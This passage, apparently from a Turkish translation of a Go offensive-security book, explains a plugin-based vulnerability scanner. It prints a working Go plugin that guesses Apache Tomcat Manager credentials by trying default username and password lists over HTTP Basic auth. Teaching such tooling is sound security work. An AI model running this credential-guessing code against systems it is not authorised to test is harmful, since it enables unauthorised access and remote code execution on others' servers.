Go eklentileri ve genişletilebilir araçlar   221
dönüştürülen değeri `newfunc` adlı bir değişkene atarsınız. Sonra bunu çağırır ve dönen değeri `check` adlı bir değişkene atarsınız. Tür doğrulaması (type assertion) sayesinde, `check` değişkeninin `scanner.Checker` arayüzünü karşıladığını bilirsiniz; dolayısıyla `Check()` fonksiyonunu uygulamış olmalıdır. Bu fonksiyonu, hedef bir sunucu (host) ve port 0 vererek çağırırsınız. Sonuç olarak elde edilen `*scanner.Result` tipi değer `res` adlı bir değişkene alınır ve hizmetin savunmasız (vulnerable) olup olmadığını belirlemek için incelenir.
 
Bu sürecin genel bir yapıda olduğuna dikkat edin; eklentileri dinamik olarak çağırabileceğiniz bir yapı oluşturmak için tür doğrulamaları ve arayüzler kullanır. Kodun hiçbir yerinde tek bir zafiyet imzasına veya bir zafiyetin varlığını kontrol etmek için kullanılan belirli bir yönteme özel bir bağımlılık yoktur. Bunun yerine, işlevselliği yeterince soyutladınız; böylece eklenti geliştiricileri, diğer eklentiler hakkında — hatta tüketen uygulama hakkında — kapsamlı bilgiye sahip olmadan, bağımsız eklentiler geliştirebilir ve belirli iş birimlerini yerine getirebilir. Eklenti yazarlarının tek endişelenmesi gereken şey, uygun şekilde dışa açılmış (exported) `New()` fonksiyonunu ve `scanner.Checker` arayüzünü uygulayan bir tip oluşturmak. Gelin bunu yapan bir eklentiye bakalım.

## Parola Tahmini Yapan Bir Eklenti İnşa Etmek

Bu eklenti (Liste 10-3), Apache Tomcat Manager giriş portalına karşı bir parola tahmin saldırısı gerçekleştirir. Saldırganların gözdesi olan bu portal, genellikle kolay tahmin edilebilir kimlik bilgilerini kabul edecek şekilde yapılandırılmıştır. Geçerli kimlik bilgileriyle bir saldırgan, alttaki sistemde güvenilir şekilde rastgele kod çalıştırabilir. Saldırganlar için kolay bir kazançtır.
 
Kod incelememizde, zafiyet testinin özel ayrıntılarını ele almayacağız; sonuçta bu, belirli bir URL’ye gönderilen bir dizi HTTP isteğinden ibaret. Bunun yerine, öncelikle eklentilenebilir tarayıcının (pluggable scanner) arayüz gereksinimlerini sağlamaya odaklanacağız.

```go
import (
   // Some snipped for brevity
   "github.com/blackhatgabhg/ch-10/plugin-core/scanner "
)

var Users = []string{"admin", "manager", "tomcat"}
var Passwords = []string{"admin", "manager", "tomcat", "password"}

// TomcatChecker implements the scanner.Check interface. Used for guessing Tomcat creds
type TomcatChecker struct{}

// Check attempts to identify guessable Tomcat credentials
func (c *TomcatChecker) Check(host string, port uint64) *scanner.Result {
    var (
         resp *http.Response
         err    error
         url    string
         res    *scanner.Result
         client *http.Client
         req    *http.Request
    )

    log.Println("Checking for Tomcat Manager...")

    res = new(scanner.Result)
    url = fmt.Sprintf("http://%s:%d/manager/html", host, port)
    if resp, err = http.Head(url); err != nil {
         log.Printf("HEAD request failed: %s\n", err)
         return res
    }

    log.Println("Host responded to /manager/html request")
    // Got a response back, check if authentication required
    if resp.StatusCode != http.StatusUnauthorized || resp.Header.Get("WWW-Authenticate") == "" {
         log.Println("Target doesn't appear to require Basic auth.")
         return res
    }

    // Appears authentication is required. Assuming Tomcat manager. Guess passwords...
    log.Println("Host requires authentication. Proceeding with password guessing...")
    client = new(http.Client)
    if req, err = http.NewRequest("GET", url, nil); err != nil {
         log.Println("Unable to build GET request")
         return res
    }

    for _, user := range Users {
         for _, password := range Passwords {
             req.SetBasicAuth(user, password)
             if resp, err = client.Do(req); err != nil {
                  log.Println("Unable to send GET request")
                  continue
             }

             if resp.StatusCode == http.StatusOK {
                  res.Vulnerable = true
                  res.Details = fmt.Sprintf("Valid credentials found - %s:%s", user, password)
                  return res
             }
         }
    }

    return res
}

// New is the entry point required by the scanner
func New() scanner.Checker {
    return new(TomcatChecker)
}
```

**Liste 10-3:** Tomcat kimlik bilgisi tahmini yapan bir eklentiyi yerel olarak oluşturmak (`ch-10/plugin-tomcat/main.go`)

İlk olarak, daha önce ayrıntılandırdığımız `scanner` paketini içe aktarmanız gerekir. Bu paket, hem `Checker` arayüzünü hem de oluşturacağınız `Result` struct’ını tanımlar. `Checker` arayüzünün bir uygulamasını (implementation) oluşturmak için, `TomcatChecker` adlı boş bir struct tipi tanımlayarak başlarsınız. `Checker` arayüzünün uygulama gereksinimlerini karşılamak için, gerekli `Check(host string, port uint64) *scanner.Result` fonksiyon imzasıyla eşleşen bir metot oluşturursunuz. Bu metodun içinde, tüm özel zafiyet kontrolü mantığınızı gerçekleştirirsiniz.
 
`*scanner.Result` döndürmeniz beklendiğinden, bir tane örnek oluşturur ve `res` adlı bir değişkene atarsınız. Koşullar sağlanırsa — yani checker tahmin edilebilir kimlik bilgilerini doğrularsa — ve zafiyet doğrulanırsa, `res.Vulnerable` alanını `true` yapar ve `res.Details` alanını tespit edilen kimlik bilgilerini içeren bir mesajla doldurursunuz. Zafiyet tespit edilmezse, döndürülen örneğin `res.Vulnerable` alanı varsayılan durumda — `false` — kalacaktır.
 
Son olarak, gerekli dışa açılmış `New() *scanner.Checker` fonksiyonunu tanımlarsınız. Bu fonksiyon, tarayıcınızın `Lookup()` çağrısının beklentilerine, ayrıca eklentinin tanımladığı `TomcatChecker` tipini örneklemek için gerekli tür doğrulaması ve dönüştürmesine uygunluk gösterir. Bu temel giriş noktası, yalnızca yeni bir `*TomcatChecker` döndürmekten fazlasını yapmaz (ki bu, gerekli `Check()` metodunu uyguladığı için bir `scanner.Checker`’dır).
